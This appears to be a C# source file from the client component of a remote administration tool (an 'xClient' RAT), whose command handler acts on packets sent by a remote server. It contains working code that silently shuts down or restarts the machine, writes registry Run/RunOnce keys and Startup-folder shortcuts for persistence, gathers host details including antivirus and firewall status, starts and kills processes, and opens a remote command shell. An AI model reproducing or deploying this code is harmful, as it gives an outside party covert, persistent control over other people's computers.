using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Core.Information;
using xClient.Core.RemoteShell;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
    public static partial class CommandHandler
    {
        public static void HandleDrives(Packets.ServerPackets.Drives command, Client client)
        {
            new Packets.ClientPackets.DrivesResponse(Environment.GetLogicalDrives()).Execute(client);
        }

        public static void HandleAction(Packets.ServerPackets.Action command, Client client)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (command.Mode)
                {
                    case 0:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case 1:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case 2:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch
            {
                new Packets.ClientPackets.Status("Action failed!").Execute(client);
            }
        }

        public static void HandleGetStartupItems(Packets.ServerPackets.GetStartupItems command, Client client)
        {
            try
            {
                Dictionary<string, int> startupItems = new Dictionary<string, int>();

                using (
                    var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                        {
                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 0);
                        }
                    }
                }
                using (
                    var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                        {
                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 1);
                        }
                    }
                }
                using (
                    var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false)
                    )
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                        {
                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 2);
                        }
                    }
                }
                using (
                    var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                        {
                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 3);
                        }
                    }
                }
                if (OSInfo.Bits == 64)
                {
                    using (
                        var key =
                            Registry.LocalMachine.OpenSubKey(
                                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
                                false))
                    {
                        if (key != null)
                        {
                            foreach (var k in key.GetValueNames())
                            {
                                if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
                                startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 4);
                            }
                        }
                    }
                    using (
                        var key =
                            Registry.LocalMachine.OpenSubKey(
                                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                                false))
                    {
                        if (key != null)
                        {
                            foreach (var k in key.GetValueNames())
                            {
                                if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
                                startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 5);
                            }
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files =
                        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
                    foreach (var file in files)
                    {
                        if (file.Name != "desktop.ini")
                            startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 6);
                    }
                }

                new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
            }
            catch
            {
                new Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
            }
        }

        public static void HandleAddStartupItem(Packets.ServerPackets.AddStartupItem command, Client client)
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                            key.Close();
                        }
                        break;
                    case 1:
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey(
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                            key.Close();
                        }
                        break;
                    case 2:
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                            key.Close();
                        }
                        break;
                    case 3:
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey(
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                            key.Close();
                        }
                        break;
                    case 4:
                        if (OSInfo.Bits != 64)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey(
                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                            key.Close();
                        }
                        break;
                    case 5:
                        if (OSInfo.Bits != 64)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey(
                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                            key.Close();
                        }
                        break;
                    case 6:
                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                        {
                            try
                            {
                                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                            }
                            catch (Exception ex)
                            {
                                new Packets.ClientPackets.Status(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
                                return;
                            }
                        }

                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                            command.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.Status(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleAddRemoveStartupItem(Packets.ServerPackets.RemoveStartupItem command, Client client )
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            key.DeleteValue(command.Name, true);
                            key.Close();
                        }
                        break;
                    case 2:
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            key.DeleteValue(command.Name, true);
                            key.Close();
                        }
                        break;
                    case 3:
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey(
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            key.DeleteValue(command.Name, true);
                            key.Close();
                        }
                        break;
                    case 4:
                        if (OSInfo.Bits != 64)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey(
                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            key.DeleteValue(command.Name, true);
                            key.Close();
                        }
                        break;
                    case 5:
                        if (OSInfo.Bits != 64)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey(
                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception("Registry key does not exist");
                            key.DeleteValue(command.Name, true);
                            key.Close();
                        }
                        break;
                    case 6:
                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);

                        if (!File.Exists(lnkPath))
                            throw new IOException("File does not exist");

                        File.Delete(lnkPath);
                        break;
                }
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.Status(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
        {
            try
            {
                string[] infoCollection = new string[]
                {
                    "Processor (CPU)",
                    SystemCore.GetCpu(),
                    "Memory (RAM)",
                    string.Format("{0} MB", SystemCore.GetRam()),
                    "Video Card (GPU)",
                    SystemCore.GetGpu(),
                    "Username",
                    SystemCore.GetUsername(),
                    "PC Name",
                    SystemCore.GetPcName(),
                    "Uptime",
                    SystemCore.GetUptime(),
                    "MAC Address",
                    SystemCore.GetMacAddress(),
                    "LAN IP Address",
                    SystemCore.GetLanIp(),
                    "WAN IP Address",
                    SystemCore.WanIp,
                    "Antivirus",
                    SystemCore.GetAntivirus(),
                    "Firewall",
                    SystemCore.GetFirewall()
                };

                new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
            }
            catch
            {
            }
        }

        public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
        {
            Process[] pList = Process.GetProcesses();
            string[] processes = new string[pList.Length];
            int[] ids = new int[pList.Length];
            string[] titles = new string[pList.Length];

            int i = 0;
            foreach (Process p in pList)
            {
                processes[i] = p.ProcessName + ".exe";
                ids[i] = p.Id;
                titles[i] = p.MainWindowTitle;
                i++;
            }

            new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
        }

        public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
        {
            if (string.IsNullOrEmpty(command.Processname))
            {
                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
                return;
            }

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    FileName = command.Processname
                };
                Process.Start(startInfo);
            }
            catch
            {
                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
            }
            finally
            {
                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
            }
        }

        public static void HandleKillProcess(Packets.ServerPackets.KillProcess command, Client client)
        {
            try
            {
                Process.GetProcessById(command.PID).Kill();
            }
            catch
            {
            }
            finally
            {
                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
            }
        }

        public static void HandleShellCommand(Packets.ServerPackets.ShellCommand command, Client client)
        {
            string input = command.Command;

            if (_shell == null && input == "exit") return;
            if (_shell == null) _shell = new Shell();

            if (input == "exit")
                CloseShell();
            else
                _shell.ExecuteCommand(input);
        }

        public static void CloseShell()
        {
            if (_shell != null)
                _shell.Dispose();
        }
    }
}
